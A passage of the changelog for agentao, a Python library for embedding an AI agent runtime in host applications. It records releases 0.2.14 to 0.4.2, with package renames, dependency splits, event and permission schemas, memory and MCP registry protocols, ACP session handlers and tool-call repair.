  v0.73. Keep / cut / reframe verdicts for each candidate.

## [0.4.2] — 2026-05-01

### Changed

- **Public package rename: `agentao.harness` → `agentao.host`** (with
  matching renames to public types, schema-export functions, and wire
  schema file names). The host-facing contract package is renamed to
  reflect what it actually is — the surface a host application talks
  to, around the Agentao runtime (the design doc still calls Agentao
  itself the "harness" embedded inside the host). The old names are
  inconsistent under the new package (`from agentao.host import
  HarnessEvent` reads wrong), so the cleanup is bundled.

  Renamed surface:

  | Old | New |
  |---|---|
  | `agentao.harness` (module path) | `agentao.host` |
  | `HarnessEvent` | `HostEvent` |
  | `export_harness_event_json_schema()` | `export_host_event_json_schema()` |
  | `export_harness_acp_json_schema()` | `export_host_acp_json_schema()` |
  | `HarnessReplaySink` | `HostReplaySink` |
  | `harness_event_to_replay_kind()` | `host_event_to_replay_kind()` |
  | `harness_event_to_replay_payload()` | `host_event_to_replay_payload()` |
  | `replay_payload_to_harness_event()` | `replay_payload_to_host_event()` |
  | `docs/schema/harness.events.v1.json` | `docs/schema/host.events.v1.json` |
  | `docs/schema/harness.acp.v1.json` | `docs/schema/host.acp.v1.json` |

  All old names continue to work as deprecated aliases on the
  `agentao.harness` shim package, with one `DeprecationWarning` on
  first import naming the new path. The whole alias surface — package,
  types, functions — is scheduled for removal in 0.5.0.

  Migration is a literal find/replace:

  ```diff
  - from agentao.harness import HarnessEvent, EventStream
  + from agentao.host    import HostEvent,    EventStream

  - from agentao.harness.protocols import FileSystem, ShellExecutor
  + from agentao.host.protocols    import FileSystem, ShellExecutor

  - export_harness_event_json_schema()
  + export_host_event_json_schema()
  ```

  Wire schema bytes are byte-for-byte regenerated from the same
  Pydantic models; the only differences vs. the 0.4.1 snapshots are the
  identifier names (`HostEvent` instead of `HarnessEvent`) and the
  top-level title (`AgentaoHostEvents`). The `v1` lineage is unchanged
  — adding optional fields stays in v1; removing or renaming a field
  still requires a v2 bump.

## [0.4.0] — 2026-05-01

The single break release of the Path A P0 plan
(see `docs/design/path-a-roadmap.md` §3.2). The break is a packaging
change only — no public Python API is renamed, removed, or signature-
changed. The "no-change" upgrade line is `pip install 'agentao[full]'`,
which reproduces the 0.3.x bundled closure exactly (CI-enforced against
a 122-package baseline).

### Breaking changes

- **P0.9 dependency split** — `pip install agentao` now installs only
  the core (7 packages) needed to construct an `Agentao()` instance and
  call `chat()` against an OpenAI-compatible endpoint. CLI, web fetch,
  and Chinese tokenization become opt-in extras.

  Closure equivalence is enforced by `tests/test_dependency_split.py`
  against `tests/data/full_extras_baseline.txt` (122 packages frozen
  on 2026-05-01). See `docs/migration/0.3.x-to-0.4.0.md` for the full
  guide.

### Added

- **P0.10 friendly missing-dep error** — running the `agentao` CLI in
  a core-only install (no `[cli]` extra) now exits 2 with a one-line
  actionable message instead of crashing with an opaque
  `ModuleNotFoundError: rich`:

  ```
  agentao CLI requires extra packages (missing: rich).
    pip install 'agentao[cli]'   # CLI surface only
    pip install 'agentao[full]'  # 0.3.x-equivalent closure
  See docs/migration/0.3.x-to-0.4.0.md for details.
  ```

  Implementation: `agentao/cli/__init__.py` defines `entrypoint()`
  inline (no module-level imports of rich / prompt_toolkit / readchar /
  pygments) so the module load itself stays free of CLI deps; every
  `[cli]` dep is preflighted via `importlib.util.find_spec` so a
  partial install (rich present, prompt_toolkit missing) still hits
  the friendly path instead of leaking a "Fatal error" from
  `entrypoints.run_init_wizard`'s broad `except Exception`. All other
  public names in `agentao.cli` lazy-load via PEP 562 `__getattr__`.
  Slow-marked tests in `tests/test_cli_missing_dep_message.py` cover
  the friendly-message path, the post-`[cli]` boot path, the
  no-trace-leak invariant, and the partial-install regression.

- **`docs/migration/0.3.x-to-0.4.0.md`** — full migration guide with
  install matrix, dependency map, common project-shape recipes, and
  a `[full]` fallback for any path the migration may have missed.

### Changed

- **Web tools omitted from the registry without `[web]`** —
  `WebFetchTool` and `WebSearchTool` register only when
  `beautifulsoup4` is importable. In a core install the model never
  sees `web_fetch` / `web_search` in its tool schema (vs. the previous
  behaviour of registering them and failing at execute time with an
  opaque ImportError). Mirrors the existing `bg_store is not None`
  pattern that already conditionally registers the background-agent
  tools.

- **Memory recall degrades gracefully without `[i18n]`** —
  `MemoryRetriever.tokenize()` skips the jieba code path entirely
  when the query has no CJK characters (cheap regex check). On a
  CJK-bearing query in a `[i18n]`-less install, `_cjk_segment()`
  returns an empty set with a one-time warning pointing at
  `pip install 'agentao[i18n]'` instead of silently failing.

- **CI test environment installs `[cli,web,i18n]`** — the existing
  unit-test surface imports `from agentao.cli import AgentaoCLI`,
  the web-fetch tool, and the jieba memory path. The default `Test`
  matrix job now installs those three extras so the suite still
  resolves in the core-split world. The core-only contract is
  independently validated by the smoke job and
  `tests/test_dependency_split.py`.

- **Shared test helper `tests/support/wheel.py`** — `REPO_ROOT`,
  `find_wheel()`, `require_wheel()`, and `make_venv()` centralized
  out of the venv-creation pattern that was duplicated across
  `test_clean_install_smoke.py`, `test_dependency_split.py`, and
  `test_cli_missing_dep_message.py`.

## [0.3.4] — 2026-05-01

Second release executing the **Path A roadmap** (see
`docs/design/path-a-roadmap.md`). Lands the §11 P0.4–P0.8 working set
in five logical commits. Still fully additive — no required code
change to upgrade from 0.3.3 (the only namespace move,
`agentao/display.py` → `agentao/cli/display.py`, had no in-tree
consumers).

### Added

- **P0.4 typing gate** — `agentao.harness` now ships clean under
  `mypy --strict`. New `agentao.harness.protocols` submodule re-exports
  the capability `Protocol` types (`FileSystem`, `ShellExecutor`,
  `MCPRegistry`, `MemoryStore`) plus their value shapes so embedding
  hosts have one stable import path instead of reaching into
  `agentao.capabilities.*`. CI gains a `Typing gate` job; tests cover
  the package, a downstream-shaped consumer, and `__all__` drift.
- **P0.5 lazy imports** — `from agentao import Agentao` no longer pulls
  in the OpenAI SDK, BeautifulSoup, jieba, filelock, or rich (or their
  transitive click/pygments/starlette/uvicorn closure via the MCP SDK).
  Embedded hosts pay only for what they use; the deferred libs load on
  first runtime use. Two new enforcement tests
  (`tests/test_no_cli_deps_in_core.py`, `tests/test_import_cost.py`)
  catch regressions both statically (AST walk for top-level imports
  outside `agentao/cli/`) and at runtime (`python -X importtime`).
- **P0.7 embedded-contract regression tests** — four new test files
  guard the host-facing properties most likely to silently break:
  `tests/test_no_host_logger_pollution.py` (no root-logger mutation
  through import + construction), `tests/test_multi_agentao_isolation.py`
  (two `Agentao()` instances share no state across messages, tools,
  skills, working_directory, or session_id), `tests/test_arun_events_cancel.py`
  (asyncio cancellation propagates to the chat token; events drain;
  no orphan tasks), and `tests/test_clean_install_smoke.py` (slow,
  CI-only — installs the wheel into a fresh venv and runs the README
  embed snippet). A `slow` pytest marker is registered; default runs
  skip it.
- **P0.8 replay schema v1.2 + harness→replay projection** — the
  replay JSONL format gains three harness-projected event kinds
  (`tool_lifecycle`, `subagent_lifecycle`, `permission_decision`) and
  `start_replay()` auto-wires a `HostReplaySink` that observes the
  agent's harness `EventStream` and projects every published event
  into the recorder, so embedded hosts have one audit artifact
  instead of two parallel streams. Each new kind's `oneOf` variant carries a typed payload
  derived from the public Pydantic model in `agentao.harness.models`,
  so a model field rename / removal surfaces as schema drift in CI.
  v1.0 / v1.1 schemas remain frozen and continue to validate older
  replays. New `agentao.harness.replay_projection` module:
  `HostReplaySink` (forward projection), `replay_payload_to_host_event`
  (reverse). The typed payload schemas explicitly allow the sanitizer's
  optional projection metadata (`redaction_hits`, `redacted`,
  `redacted_fields`) so a redacted harness event still validates against
  the v1.2 schema while genuine model drift still surfaces as a property
  mismatch. New `tests/test_host_to_replay_projection.py` covers the
  round trip, validates produced payloads against the v1.2 schema, and
  verifies a redacted payload (with a planted SECRET_PATTERN-shaped
  string) still passes schema validation. `SCHEMA_VERSION` bumps from
  `1.1` → `1.2`.
- **P0.6 five canonical embedding examples** — minimum-shape samples
  that run end-to-end against a fake LLM (no API key) under their own
  `pyproject.toml`: `examples/fastapi-background/` (per-request agent
  + asyncio background task), `examples/pytest-fixture/` (drop-in
  `agent` / `agent_with_reply` / `fake_llm_client` fixtures),
  `examples/jupyter-session/` (one agent per kernel, `events()`
  driving display, with a runnable `session.ipynb`),
  `examples/slack-bot/` (slack-bolt `app_mention` handler with
  channel-scoped `PermissionEngine` injection), and
  `examples/wechat-bot/` (polling daemon with contact-scoped
  `PermissionEngine`, transport-agnostic via a `WeChatClient`
  Protocol — inspired by `Wechat-ggGitHub/wechat-claude-code`). New CI
  `examples` job matrix runs each example's smoke suite in a fresh
  venv. `examples/README.md` gains a top-of-file table mapping each
  host shape to its directory.

### Changed

- **`agentao/display.py` moved to `agentao/cli/display.py`** — the
  `DisplayController` was used only by the CLI. Hosts that imported
  `agentao.display` directly should now import from `agentao.cli.display`
  (no in-tree consumers were affected).

## [0.3.3] — 2026-04-30

First release executing the **Path A roadmap** (see
`docs/design/path-a-roadmap.md`). Pure-additive patch. No required
code change to upgrade.

### Added

- **PEP 561 `py.typed` marker** — `agentao/py.typed` ships in wheel
  and sdist so downstream `mypy` / `pyright` consumers pick up
  Agentao's type hints instead of treating the package as untyped.

### Changed

- **README leads with embedding (`## Embed in 30 lines`)** — the
  CLI walkthrough is preserved verbatim under `## CLI Quickstart`.
  Reflects the locked Path A positioning: `agentao` is primarily a
  library to embed in Python hosts.

### Internal

- CI smoke job now asserts `py.typed` presence in the installed
  wheel and verifies bare `Agentao(...)` construction (the README
  snippet, verbatim) succeeds without env discovery or network.

## [0.3.1] — 2026-04-30

Added-only patch in the 0.3.x series. Lands the **embedded harness
contract** as the stable host-facing API surface for embedding
Agentao: typed event stream, JSON-safe permission snapshot, and
checked-in JSON schema snapshots for both events and ACP payloads.
No required code change to upgrade from 0.3.0.

### Added

- **`agentao.harness` public package** — the host-facing
  compatibility boundary for embedding Agentao. Exports the
  Pydantic event models, the `EventStream` primitive, the
  `ActivePermissions` snapshot, and schema export helpers:
  ```python
  from agentao.harness import (
      ActivePermissions,
      EventStream,
      StreamSubscribeError,
      HostEvent,
      ToolLifecycleEvent,
      SubagentLifecycleEvent,
      PermissionDecisionEvent,
      RFC3339UTCString,
      export_host_event_json_schema,
      export_host_acp_json_schema,
  )
  ```
  Internal runtime types (`AgentEvent`, `ToolExecutionResult`,
  `PermissionEngine`) are intentionally **not** re-exported — the
  harness package is the version-stable boundary. Hosts that target
  only `agentao.harness` (plus the `Agentao(...)` constructor and
  the new methods below) stay forward-compatible across releases.

- **`Agentao.events(session_id: str | None = None)`** — async
  iterator over `HostEvent`. No replay; bounded backpressure
  (slow consumers block the producer for matching events rather
  than dropping them). Same-session ordering is guaranteed; within
  one `tool_call_id`, `PermissionDecisionEvent` precedes
  `ToolLifecycleEvent(phase="started")`. MVP supports one stream
  consumer per `Agentao` instance; a second concurrent subscriber
  for the same `session_id` filter raises `StreamSubscribeError`.

- **`Agentao.active_permissions() -> ActivePermissions`** — JSON-safe
  snapshot of the active permission policy (`mode`, `rules`,
  `loaded_sources`). Cached; invalidated on `set_mode()` and on
  `add_loaded_source(...)` with a new label.

- **`PermissionEngine.active_permissions()` + `add_loaded_source()`**
  — engine-level snapshot getter and a host-injection point for
  provenance labels. `loaded_sources` carries stable string labels:
  `preset:<mode>`, `project:<path>`, `user:<path>`,
  `injected:<name>`. MVP intentionally does not expose per-rule
  provenance.

- **Three public lifecycle event families:**
  - `ToolLifecycleEvent` — phase ∈ `{started, completed, failed}`;
    cancellation surfaces as `phase="failed", outcome="cancelled",
    error_type=None`. Raw args / outputs are never present on the
    public payload (redacted/truncated `summary` only).
  - `SubagentLifecycleEvent` — phase ∈ `{spawned, completed, failed,
    cancelled}` (cancelled is a distinct phase here). Parent/child
    ids captured at spawn time, not inferred at completion.
  - `PermissionDecisionEvent` — fires on every decision
    (`allow` / `deny` / `prompt`), not only deny/prompt. Per-call
    `decision_id`; `matched_rule` projected when a rule fires,
    `None` on fallback semantics.

- **ACP host-facing Pydantic schema** (`agentao.acp.schema`) —
  `initialize`, `session/new`, `session/load`, `session/prompt`,
  `session/cancel`, `session/setModel`, `session/setMode`,
  `session/listModels`, `session/update` notifications,
  `request_permission`, `ask_user`, and the shared `AcpError`
  envelope as Pydantic models.

- **JSON schema snapshots** under `docs/schema/`:
  `host.events.v1.json` (events + permissions) and
  `host.acp.v1.json` (ACP payloads). Generated from the Pydantic
  models, byte-equality-checked by `tests/test_host_schema.py`
  and `tests/test_acp_schema.py`. A model change that shifts the
  wire form must update the snapshot in the same PR.

- **CI fast-fail schema drift check** —
  `scripts/write_host_schema.py --check` runs in `.github/workflows/ci.yml`
  Job 0 alongside the existing replay-schema check, so harness
  schema drift fails CI before the test matrix.

- **Runtime identity helpers** (`agentao.runtime.identity`,
  internal) — `session_id` / `turn_id` / `tool_call_id` /
  `decision_id` generation and normalization. Public events depend
  on stable id propagation; the helpers are not re-exported from
  `agentao.harness`.

- **`examples/host_events.py`** — single-file runnable demo
  showing `agent.events()` + `agent.active_permissions()` wired
  alongside `agent.arun(...)` via `asyncio.gather`. Exits cleanly
  with instructions when `OPENAI_API_KEY` is missing.

- **`docs/reference/host-api.md`** + `docs/reference/host-api.zh.md` — public
  API reference, schema-snapshot policy, runtime identity contract,
  and event delivery semantics. **`docs/design/embedded-host-contract.md`**
  documents the design decision and non-goals.

- **`docs/guides/embedding.md` §7 "Host-facing harness contract"** — full
  embedding-shaped walkthrough with the `asyncio.gather` pattern;
  §8 migration guide extended with a "From 0.3.0" subsection.

- **Developer guide updates** — Appendix A.10 lists the
  `agentao.harness` exports; A.1 Methods table marks `events()` and
  `active_permissions()` as `(0.3.1+)`; Part 4.2 adds an admonition
  distinguishing `HostEvent` (host-stable) from `AgentEvent`
  (internal); Part 5.4 gains a "Reading the active policy from the
  host" subsection.

### Changed

- `agentao.runtime.sanitize.normalize_tool_calls` now synthesizes a
  UUID4 `tool_call_id` when the LLM provider returns a missing or
  empty `id`, using the same `runtime.identity.normalize_tool_call_id`
  helper the planner uses downstream. Strict Chat Completions APIs
  reject mismatched `tool_call_id` between assistant and tool roles;
  before this fix, a missing provider id left the assistant message
  with no id while the planner synthesized one for the tool result,
  producing a 400 on the next turn.

- `cli /status` permission-mode banner now reads from
  `agent.active_permissions()` instead of reaching into private
  `PermissionEngine` state, and displays `loaded_sources` for
  transparency. The CLI consumes the same public surface that
  external embedders see.

- ACP `session/new` and `session/load` now bind the session id onto
  the agent at session creation/load time so harness lifecycle
  events for that session carry the id the host knows it by.

### Dependencies

- **New direct dependency: `pydantic>=2`.** If your environment
  pins Pydantic v1, lift the pin before upgrading.

### Notes

- This is an **Added-only patch** — the 0.3.x series treats
  additive public surfaces as patch-eligible during pre-1.0. Strict
  SemVer consumers should read it as equivalent to a minor bump.
- Public events deliberately omit raw tool args, raw stdout/stderr,
  raw diffs, and MCP raw responses. Only redacted/truncated
  `summary` / `task_summary` / `reason` strings reach hosts.

## [0.3.0] — 2026-04-29

### Added

- **`MCPRegistry` capability protocol** (Issue #17). Embedded hosts
  can now enumerate MCP servers from any source (in-process dict,
  plugin system, dynamic discovery, remote registry) without writing
  to `.agentao/mcp.json`. Two default implementations ship in
  `agentao.mcp.registry`: `FileBackedMCPRegistry` (CLI/ACP default —
  reads `<wd>/.agentao/mcp.json` + `~/.agentao/mcp.json`,
  byte-equivalent to the pre-Protocol behavior) and
  `InMemoryMCPRegistry` (programmatic counterpart for hosts and
  tests). Re-exported from `agentao.capabilities` for symmetry with
  `FileSystem` / `MemoryStore`:
  ```python
  from agentao.capabilities import (
      MCPRegistry, FileBackedMCPRegistry, InMemoryMCPRegistry,
  )
  ```
- `Agentao(mcp_registry=...)` keyword. Mutually exclusive with
  `mcp_manager=` (which is the pre-built construction outcome — the
  registry is the config source for construction). Bare
  `Agentao(working_directory=...)` outside the factory still falls
  back to `load_mcp_config` so existing CLI-shaped scripts keep
  working.

- **`MemoryStore` capability protocol** (Issue #16). Embedded hosts
  can now swap memory backends — Redis, Postgres, in-process dict,
  remote API — without subclassing or forking `MemoryManager`. The
  `SQLiteMemoryStore` default is unchanged and remains the CLI/ACP
  backing store. Re-exported from `agentao.capabilities` for symmetry
  with `FileSystem` / `LocalFileSystem` / `ShellExecutor`:
  ```python
  from agentao.capabilities import MemoryStore, SQLiteMemoryStore
  ```
- `SQLiteMemoryStore.open(path)` — strict path-based constructor that
  creates the parent dir and propagates `OSError` / `sqlite3.Error`
  on failure. Use this for the user-scope store where a failure
  should disable the scope rather than silently degrade.
- `SQLiteMemoryStore.open_or_memory(path)` — graceful constructor
  that degrades to `:memory:` on `OSError` / `sqlite3.Error`. Use
  this for the project-scope store where a missing DB is preferable
  to a crashed agent (matches the pre-#16 ACP fault-tolerance).
  The two classmethods make the asymmetry between
  project-falls-back and user-disables explicit at every call site;
  no boolean disambiguation needed.

### Changed

- `agentao.embedding.build_from_environment()` now constructs a
  `FileBackedMCPRegistry(project_root=wd, user_root=user_root())` and
  passes it to `Agentao` as `mcp_registry=`. CLI and ACP behavior is
  unchanged because the registry resolves the same files. Hosts that
  want programmatic registration pass an explicit `mcp_registry=`
  (or any `MCPRegistry`-compatible object) to override the default.
- `agentao.memory.MemoryStore` is no longer re-exported from
  `agentao.memory` — the canonical home is `agentao.capabilities`.
  Re-exporting it from the memory package would force
  `import agentao.memory` to load all of `agentao.capabilities`,
  which after Issue #17 transitively pulls the MCP SDK and breaks
  the `tests/test_memory_decoupling.py` decoupling guarantee.

- `MemoryManager(project_store=..., user_store=...)` now accepts
  pre-built `MemoryStore` instances. Path-based construction (the
  pre-#16 shape) moves to the call site:
  ```python
  # before:
  mgr = MemoryManager(project_root=p, global_root=g)
  # after:
  mgr = MemoryManager(
      project_store=SQLiteMemoryStore.open_or_memory(p / "memory.db"),
      user_store=SQLiteMemoryStore.open(g / "memory.db") if g else None,
  )
  ```
  CLI and ACP users see no change because the factory
  (`agentao.embedding.build_from_environment()`) absorbs the new
  construction shape internally.
- The `:memory:` fallback for unwritable project DBs has moved from
  `MemoryManager.__init__` into `SQLiteMemoryStore.open_or_memory`.
  Behavior is observably identical: project store still degrades to
  `:memory:` on `OSError` / `sqlite3.OperationalError`, user store
  is still disabled with a warning on the same errors.
- `agentao.memory.MemoryManager` no longer imports `sqlite3` and has
  no filesystem knowledge. Embedded hosts that construct it directly
  with custom stores see zero disk I/O from the manager.

### Removed

- `MemoryManager.__init__(project_root=, global_root=)` — replaced by
  the explicit-store signature above. **Migration:** build the stores
  via `SQLiteMemoryStore.open_or_memory(path)` (or `.open(path)`) and
  pass them as `project_store=` / `user_store=` kwargs.
- `MemoryManager._project_root` / `MemoryManager._global_root` private
  attributes are gone. Tests / introspectors that probed these
  should read `manager.project_store.db_path` (or accept that a
  swapped backend may not expose any path at all).

### BREAKING

- **`Agentao(working_directory=)` is now required** (Issue #14, the
  hard break promised in the 0.2.16 soft-deprecation cycle).
  `working_directory` is a required keyword argument; calling
  `Agentao()` without it raises `TypeError` from Python's signature
  dispatch — there is no longer a `Path.cwd()` lazy fallback. Two
  Agentao instances created with different `working_directory`
  values report independent paths even in the same process; an
  `os.chdir` inside the host has no effect on an already-constructed
  Agentao. **Migration:** pass an explicit `Path` (preferred for
  embedded hosts), or use
  `agentao.embedding.build_from_environment()` for CLI-style
  auto-detection from the surrounding `cwd` / `.env` / `.agentao/`.
  CLI and ACP behavior is unchanged because both already route
  through the factory; the audit confirmed `os.chdir` is never
  called inside `agentao/`, so no mid-process cwd retargeting is
  affected.

### Removed

- `Agentao.__init__` no longer emits a `DeprecationWarning` when
  `working_directory` is missing — the warning was the 0.2.16
  one-cycle migration aid and is now obsolete because the argument
  is required at the signature level.
- `Agentao._explicit_working_directory` private attribute renamed
  to `Agentao._working_directory` (always populated, never
  `Optional`). External code should not read this; callers should
  use the `agent.working_directory` property.
- `Agentao.working_directory` property no longer falls back to
  `Path.cwd()`. The "lazy cwd" branch (`agent.py:376-378` in
  0.2.16) is deleted; the property now returns the frozen value
  unconditionally.

---

## [0.2.16] — 2026-04-28

Maintenance release that completes the **embedded-harness M2/M3
milestones**. `Agentao(...)` is now a pure-injection construction
surface: nothing in the constructor implicitly reads `os.environ`,
`Path.home()`, `Path.cwd()`, or `<wd>/.agentao/*.json` unless the
caller routes through `agentao.embedding.build_from_environment()`.
CLI and ACP both go through the factory, so end-user behavior is
unchanged; embedded hosts get a deterministic, side-effect-free
construction surface plus an `await agent.arun(...)` async path,
opt-in `replay` / `sandbox` / `bg_store`, and a
`DeprecationWarning` for `Agentao()` constructed without
`working_directory=` (a `TypeError` in `0.3.0`).

See [`docs/releases/v0.2.16.md`](docs/releases/v0.2.16.md) for the
release summary and maintainer checklist.

### Added

- **Embedded harness foundations** (Issues #9-#13). Agentao is now
  positioned as an embedded agent runtime that hosts can drop into
  their own apps without the implicit cwd/env/.agentao/ side effects
  the CLI relies on. Headline pieces:
  - `agentao.capabilities.FileSystem` / `ShellExecutor` protocols
    plus `LocalFileSystem` / `LocalShellExecutor` defaults. File,
    search, and shell tools route through them, so embedded hosts
    can swap in Docker exec, virtual filesystems, or remote runners
    without monkey-patching `subprocess` / `pathlib`.
  - `agentao.embedding.build_from_environment(...)` factory that
    captures every implicit `.env` / `.agentao/permissions.json` /
    `.agentao/mcp.json` / cwd read in one place. CLI and ACP route
    through it so subsystem fallbacks become dead code from their
    perspective.
  - `Agentao.__init__` accepts explicit injections for
    `llm_client`, `logger`, `memory_manager`, `skill_manager`,
    `project_instructions`, `mcp_manager`, `filesystem`, and
    `shell`. When `skill_manager` or `project_instructions` is
    injected, the auto-discovery / disk-read paths are skipped.
  - `Agentao.arun(...)` async surface that bridges sync chat
    internals through `loop.run_in_executor`. Async hosts can
    `await agent.arun(...)` without rolling their own thread
    bridge; cancellation, replay, and `max_iterations` behave
    identically across `chat()` and `arun()`.
- Sub-agent construction in `agentao/agents/tools.py` no longer
  re-reads provider env vars (`{PROVIDER}_API_KEY` / `_BASE_URL`).
  Children inherit the parent's already-resolved LLM config so a
  mid-run env mutation cannot create a credential split.

### Changed

- **`Replay` / `Sandbox` / `BackgroundTaskStore` are now opt-in**
  (Issue 9 of the embedded-harness epic). `Agentao.__init__` accepts
  three new keyword-only kwargs: `replay_config`, `sandbox_policy`,
  and `bg_store`. Each defaults to `None`, which now means *fully
  disabled* — embedded hosts that didn't ask for the feature pay
  zero cost. `agentao.embedding.build_from_environment()` constructs
  CLI defaults for all three (anchored to the session's working
  directory) and passes them explicitly, so CLI and ACP behavior is
  unchanged. Callers can pass `bg_store=None` etc. as a factory
  override to disable a feature even on the CLI path.
  - When `bg_store=None`: `check_background_agent` and
    `cancel_background_agent` are not registered, the chat loop's
    background-notification drain short-circuits, and the
    `run_in_background` field is **schema-level removed** from
    sub-agent tool definitions (not expose-then-error). The LLM
    cannot be tempted to call a disabled feature, and ACP / OpenAI
    tool catalogs do not advertise it. `/agent bg|dashboard|cancel|
    delete|logs|result` CLI subcommands short-circuit with a clear
    warning when invoked against an Agentao with `bg_store=None`.
  - When `sandbox_policy=None`: `ToolRunner` runs shell commands
    without the macOS sandbox-exec wrapper.
  - When `replay_config=None`: no `<wd>/.agentao/replay.json` is
    read at construction time; `Agentao._replay_config` falls back
    to the no-op `ReplayConfig()` default.

- **Subsystem constructors no longer fall back to `os.environ` /
  `Path.cwd()` / `Path.home()`** (Issue 5 of the embedded-harness
  epic, PR 3b). Callers must now supply explicit arguments — CLI,
  ACP, and `agentao.embedding.build_from_environment()` already do,
  so end-user behavior is unchanged. Direct constructions in
  embedded-host code or test code may break; the migration is to
  pass the previously-implicit values explicitly.
  - `LLMClient(api_key=, base_url=, model=)` are required keyword
    arguments; `temperature` defaults to `0.2` and `max_tokens` to
    `65536` in code (no more `LLM_TEMPERATURE` / `LLM_MAX_TOKENS`
    env reads). `Agentao` now also accepts a top-level
    `max_tokens=` kwarg that forwards to `LLMClient`. The factory
    is the single place that resolves `LLM_PROVIDER` /
    `*_API_KEY` / `*_BASE_URL` / `*_MODEL` / `LLM_TEMPERATURE` /
    `LLM_MAX_TOKENS`.
  - `PermissionEngine(project_root=)` is required; new keyword-only
    `user_root=` (defaults to `None`) replaces the implicit
    `Path.home() / ".agentao"` user-rules read. The factory and ACP
    `session/new` / `session/load` pass both roots explicitly.
  - `load_mcp_config(project_root=)` is required; new keyword-only
    `user_root=` (defaults to `None`) replaces the implicit
    `Path.home() / ".agentao"` user-scope read. `save_mcp_config()`
    drops `global_config: bool` in favor of an explicit
    `config_dir: Path`. CLI `/mcp add` / `/mcp remove` resolve the
    project directory through `cli.agent.working_directory`
    instead of `Path.cwd()`.
  - `Agentao.__init__` no longer defaults `MemoryManager`'s
    `global_root` to `Path.home() / ".agentao"` when no
    `memory_manager` is injected; pure-injection construction is
    now project-scope only. CLI / ACP receive the user root through
    the factory exactly as before.

### Deprecated

- `Agentao()` without `working_directory=` emits a `DeprecationWarning`
  and will become a `TypeError` in 0.3.0. Pass an explicit `Path` —
  or use `agentao.embedding.build_from_environment()` for CLI-style
  cwd / `.env` / `.agentao/` auto-discovery.

## [0.2.15] — 2026-04-27

Maintenance follow-up to `0.2.14`. Headline: **ACP control-plane
parity** — `session/set_model`, `session/set_mode`, and
`session/list_models` handlers land so ACP clients (Zed and others)
can drive model switching, permission-mode toggles, and capability
discovery on a live session. The same release fixes three
correctness gaps around the ACP stdio channel and streaming
`reasoning_content`.

### Added

- **`session/set_model` handler** (`agentao/acp/session_set_model.py`):
  apply `model` / `contextLength` / `maxTokens` independently on a
  running session via `agent.set_model()` and `agent.context_manager.max_tokens`
  / `agent.llm.max_tokens`. Each knob is optional; partial requests
  do not reset untouched fields. Holds the session's idle turn lock
  so an in-flight `session/prompt` cannot observe a mid-stream
  change. Conversation history and tool state are preserved.
- **`session/set_mode` handler** (`agentao/acp/session_set_mode.py`):
  toggle `PermissionEngine` mode (`default` / `acceptEdits` /
  `bypassPermissions` / `plan`) per session via
  `permission_engine.set_mode(...)`.
- **`session/list_models` handler** (`agentao/acp/session_list_models.py`):
  call `agent.list_available_models()` and cache the result on
  `AcpSessionState.last_known_models`. On provider lookup failure,
  returns the cached list plus a `warning` field instead of a
  JSON-RPC error so transient provider outages don't blank the UI.
- **Shared session-validation helper**
  (`agentao/acp/_handler_utils.py`): single point for "does this
  `session_id` exist, is it ours, did the client send a well-formed
  request" so each new handler does not re-derive the contract.
- **Streaming `reasoning_content` capture** (`agentao/llm/client.py`):
  thinking-model output arriving on the streaming `delta` is now
  forwarded the same way as the non-streaming
  `message.reasoning_content` field, so transport `THINKING` events
  no longer drop reasoning text from streaming backends.
- **Test coverage** for all of the above:
  `tests/test_acp_session_set_model.py` (484 lines, 31 cases),
  `tests/test_chat_stream_reasoning.py`,
  `tests/test_llm_handler_marker.py`,
  `tests/test_shell_stdin_devnull.py`.

### Fixed

- **Outsider log handlers preserved across `LLMClient` reconstruction**
  (`agentao/llm/client.py`): the package-root handler eviction now
  only drops handlers tagged with `_agentao_llm_file_handler=True`.
  Previously, every `LLMClient` rebuild (which `set_model` triggers,
  and which the test suite triggers repeatedly) silently evicted
  unrelated handlers — including the `AcpServer` stderr-guard handler
  that protects the ACP JSON-RPC stdout/stdin channel.
- **Shell subprocess no longer inherits parent stdin**
  (`agentao/tools/shell.py`): `Popen(..., stdin=subprocess.DEVNULL)`.
  Children that read from stdin (interactive prompts, `read`-style
  tooling) can no longer consume bytes from the ACP JSON-RPC stdin
  channel that the parent process owns.

### Packaging

- `.gitignore`: ignore rotated `*.log.*` files (avoid tracking the
  bounded-rotation artifacts introduced in `0.2.14`).
- `.github/workflows/ci.yml`: `actions/upload-artifact` pinned at v7
  (v8 does not exist; resolved on-branch in `e84fc0b`).

See [`docs/releases/v0.2.15.md`](docs/releases/v0.2.15.md) for the
release summary and maintainer checklist.

## [0.2.14] — 2026-04-25

Maintenance follow-up to `0.2.13` GA. Headline: **tool-call resilience
layer** for local / open-source models that drift from the OpenAI
function-call schema, plus per-session isolation polish, replay schema
drift gating, and the GitHub-Actions Node 24 prep.

### Added

- **Tool-call repair / outbound sanitize subsystem** (`agentao/runtime/`):
  three cooperating modules that sit between the LLM and the tool
  dispatcher so models like GLM, DeepSeek, Kimi and local Ollama still
  land in a runnable shape.
  - `arg_repair.py`: conservative JSON repair for malformed function
    arguments — double-encoded JSON, fenced JSON, lenient Python
    literals, trailing commas, bracket imbalance. No punctuation
    guessing.
  - `name_repair.py`: fuzzy matching that maps near-miss tool names
    (CamelCase / suffix variants) onto a registered tool when the score
    is unambiguous.
  - `sanitize.py`: outbound scrubbing — replaces lone UTF-16 surrogates
    and re-emits canonical compact JSON for repaired arguments before
    assistant / tool messages reach strict provider APIs.
  Wired into `chat_loop`, `tool_planning`, and `tool_runner`; repair is
  invisible to the model itself (only logged), preserving prompt-cache
  behaviour. Coverage: `tests/test_tool_argument_repair.py`,
  `tests/test_tool_name_repair.py`, `tests/test_outbound_sanitize.py`,
  helper `tests/support/tool_calls.py`. Documented in developer-guide
  §5.1 ("Tool-call normalization").
- **Per-instance background-task store** (commit `82edb55`): the
  background-agent registry is now per-`Agentao` instance rather than
  process-global, so concurrent ACP sessions / multi-tenant embeddings
  no longer leak handles across each other. Adds path-containment
  guards and prompt-diagnostics surfacing.
- **Replay JSON Schema export** (commit `5c85179`): `agentao/replay/`
  now ships an exported JSON Schema and a CI drift-detection job
  (`tests/test_replay_schema.py`) that fails fast when
  `agentao/replay/events.py` evolves without the schema being
  regenerated.

### Changed

- **`ToolRunner` split** (commit `f5dc034`): the monolithic
  `tool_runner` decomposed into focused `tool_planning`,
  `tool_runner` (executor), and `tool_result_formatter` modules under
  `agentao/runtime/`. Public `Agentao.chat()` contract preserved.
- **Test scaffolding** (commit `e6ccfee`): ACP test helpers extracted
  into `tests/support/` so individual test files stay focused on
  scenarios rather than fixture wiring.
